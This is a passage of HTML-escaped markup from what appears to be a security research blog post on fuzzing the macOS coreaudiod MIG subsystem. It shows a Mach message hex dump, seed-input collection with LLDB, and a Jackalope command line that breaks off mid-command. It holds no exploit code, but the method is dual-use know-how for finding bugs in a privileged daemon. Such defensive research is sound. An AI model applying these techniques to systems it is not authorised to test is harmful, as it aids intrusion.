 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_seqno:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_sender:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MACH&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MSG&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;TRAILER&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;BODY&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(32&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;bytes)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0xf5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0xf5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0xf5&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x7e&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x02&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0xa3&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x86&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x4f&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x06&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Processing&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;result:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;1&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;*******RETURN&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;MESSAGE*******&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MACH&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MSG&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;HEADER&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_bits:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_size:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;36&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_remote_port:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1094795585&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_local_port:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_voucher_port:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_id:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;1010100&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MACH&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MSG&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;BODY&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(12&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;bytes)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;/p&gt;
 &lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.7konzhrqcm2q&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Harvesting Legitimate Mach Messages&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I now had a way to deliver data directly into the MIG subsystem (&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_HALB_MIGServer_server&lt;/span&gt;&lt;span&gt;) I wanted to fuzz. However, I had no idea the specific message size, options, or data the handler was expecting. While a coverage-guided fuzzer will begin to uncover the proper message format over time, it is advantageous to obtain a &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/google/fuzzing/blob/master/docs/good-fuzz-target.md#seed-corpus&quot;&gt;seed corpus&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;of legitimate inputs when first beginning to fuzz to improve efficiency.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;To do this, I used LLDB to set a breakpoint on the MIG subsystem and dump the first argument (containing the incoming Mach message). Then, I played around with the operating system to cause Mach messages to be sent to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;Audio MIDI Setup&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;MacOS application ended up being great for this, as it allows one to create, edit, and delete audio devices.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6-HWmxbBe4uAMliJKTGLD23MtASjJPmpMkXFOuC63OTEHyxogThCcJxkUakuxs4_2PcjM403AaeOi15oP_we_atEL4TEcK38rq5ffzHeg8F1hTsYaPxBcpeHzwUvium80ShknpuIzF5jEi9y-diSsmYckJszPhQVVU_TRu5wu16yiTZKcLHhy57H5vhk/s1600/image20.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6-HWmxbBe4uAMliJKTGLD23MtASjJPmpMkXFOuC63OTEHyxogThCcJxkUakuxs4_2PcjM403AaeOi15oP_we_atEL4TEcK38rq5ffzHeg8F1hTsYaPxBcpeHzwUvium80ShknpuIzF5jEi9y-diSsmYckJszPhQVVU_TRu5wu16yiTZKcLHhy57H5vhk/s1200/image20.png&quot; border=&quot;0&quot; alt=&quot;A screenshot of macOS Audio Devices settings. A red arrow points to the &amp;quot;+&amp;quot; button in the bottom left, with a dropdown menu open showing &amp;quot;Create Aggregate Device&amp;quot; highlighted, indicating the action being taken.&quot; style=&quot;max-height: 750px; max-width: 500px;&quot;title=&quot;A screenshot of macOS Audio Devices settings. A red arrow points to the &amp;quot;+&amp;quot; button in the bottom left, with a dropdown menu open showing &amp;quot;Create Aggregate Device&amp;quot; highlighted, indicating the action being taken.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.7konzhrqcm2q&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Fuzz and Produce Crashes&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Armed with a small seed corpus and an input delivery mechanism, the next step was to configure a fuzzer to use the created fuzzing harness and obtain code coverage. I used the excellent &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/Jackalope&quot;&gt;Jackalope fuzzer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;built and maintained by Ivan Fratric. I chose Jackalope primarily for its high level of customizability&amp;mdash;it allows easy implementation of custom mutators, instrumentation, and sample delivery. Additionally, I appreciated its seamless usage on macOS, particularly its code coverage capabilities powered by &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/TinyInst&quot;&gt;TinyInst&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. I&lt;/span&gt;&lt;span&gt;n contrast, I tried and failed to collect code coverage using Frida against system daemons on macOS.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;I used the following command to start a Jackalope fuzzing run:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$ jackalope&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-in&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;in/&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-out&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;out/&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-delivery&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-instrument_module&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-target_module&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;harness&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-target_method&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;_fuzz&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-nargs&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-iterations&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-persist&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-loop&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-dump_coverage&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-cmp_coverage&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-generate_unwind&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 